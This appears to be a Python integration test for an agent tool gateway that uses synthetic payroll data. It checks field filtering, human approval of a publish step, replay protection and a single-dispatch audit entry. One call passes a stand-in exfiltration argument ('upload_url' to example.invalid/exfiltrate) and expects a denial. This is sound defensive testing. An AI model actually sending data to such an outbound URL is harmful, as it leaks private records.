#!/usr/bin/env python3
"""Exercise the actual local reference gateway using synthetic data only."""
import json
import os
import urllib.error
import urllib.request

BASE = os.environ.get("GATEWAY_URL", "http://127.0.0.1:8080")


def request(path, token, data=None, headers=None):
    combined = {"Authorization": "Bearer " + os.environ[token], "Content-Type": "application/json"}
    combined.update(headers or {})
    req = urllib.request.Request(BASE + path, data=None if data is None else json.dumps(data).encode(), headers=combined)
    try:
        with urllib.request.urlopen(req, timeout=20) as response:
            return response.status, json.load(response)
    except urllib.error.HTTPError as error:
        return error.code, json.load(error)


def call(workflow, name, arguments, operation=None):
    headers = {"Accept": "application/json, text/event-stream", "MCP-Protocol-Version": "2026-07-28", "Mcp-Method": "tools/call", "Mcp-Name": name, "X-Gateway-Workflow-ID": workflow}
    if operation:
        headers["X-Gateway-Operation-ID"] = operation
    return request("/mcp", "GATEWAY_AGENT_TOKEN", {"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": {"_meta": {"io.modelcontextprotocol/protocolVersion": "2026-07-28", "io.modelcontextprotocol/clientCapabilities": {}}, "name": name, "arguments": arguments}}, headers)


def require(condition, message):
    if not condition:
        raise RuntimeError(message)


def main():
    status, workflow = request("/v1/workflows", "GATEWAY_HOST_TOKEN", {"template_id": "payroll-report-v1"})
    require(status == 201, "trusted workflow creation failed: " + str(workflow))
    workflow_id = workflow["id"]
    print("Created trusted workflow", workflow_id)
    status, read = call(workflow_id, "payroll.read", {"resource": "payroll:2026-09"})
    require(status == 200 and "result" in read, "read was not released: " + str(read))
    require(read["result"]["structuredContent"]["total"] == 125000, "synthetic aggregate mismatch")
    require("employee_rows" not in read["result"]["structuredContent"], "unapproved field released")
    print("Released only approved synthetic aggregate fields")
    _, denied = call(workflow_id, "payroll.read", {"resource": "payroll:2026-09", "upload_url": "https://example.invalid/exfiltrate"})
    require(denied.get("error", {}).get("data", {}).get("decision", {}).get("outcome") == "DENY", "extra argument was not denied")
    print("Denied an unapproved outbound argument")
    arguments = {"resource": "payroll:2026-09", "destination": "internal-report-store"}
    status, operation = request("/v1/workflows/" + workflow_id + "/operations", "GATEWAY_AGENT_TOKEN", {"tool": "report.publish", "arguments": arguments})
    require(status == 201, "operation reservation failed: " + str(operation))
    operation_id = operation["id"]
    print("Retained operation reference before dispatch", operation_id)
    _, pending = call(workflow_id, "report.publish", arguments, operation_id)
    require(pending.get("error", {}).get("data", {}).get("decision", {}).get("outcome") == "REQUIRE_APPROVAL", "publish did not wait for approval")
    status, display = request("/v1/operations/" + operation_id, "GATEWAY_REVIEWER_TOKEN")
    require(status == 200 and display["candidate"]["arguments"] == arguments, "review display binding mismatch")
    status, _ = request("/v1/operations/" + operation_id + "/approve", "GATEWAY_AGENT_TOKEN", {})
    require(status == 403, "agent approved its own operation")
    status, approval = request("/v1/operations/" + operation_id + "/approve", "GATEWAY_REVIEWER_TOKEN", {})
    require(status == 200 and approval["request_digest"] == display["request_digest"], "independent approval failed")
    _, published = call(workflow_id, "report.publish", arguments, operation_id)
    require(published.get("result", {}).get("structuredContent", {}).get("receipt") == "published:" + operation_id, "approved publish failed: " + str(published))
    print("Approved and published exactly one synthetic report")
    _, replay = call(workflow_id, "report.publish", arguments, operation_id)
    require("result" not in replay, "replay exposed cached payload")
    status, _ = request("/v1/operations/" + operation_id + "/approve", "GATEWAY_REVIEWER_TOKEN", {})
    require(status == 403, "approval was reusable")
    status, audit = request("/v1/audit", "GATEWAY_REVIEWER_TOKEN")
    require(status == 200, "audit verification failed")
    claims = [event for event in audit if event.get("operation_id") == operation_id and event["kind"] == "DISPATCHED"]
    require(len(claims) == 1, "logical operation dispatched more than once")
    print("Verified single dispatch, approval consumption and metadata audit chain")


if __name__ == "__main__":
    main()
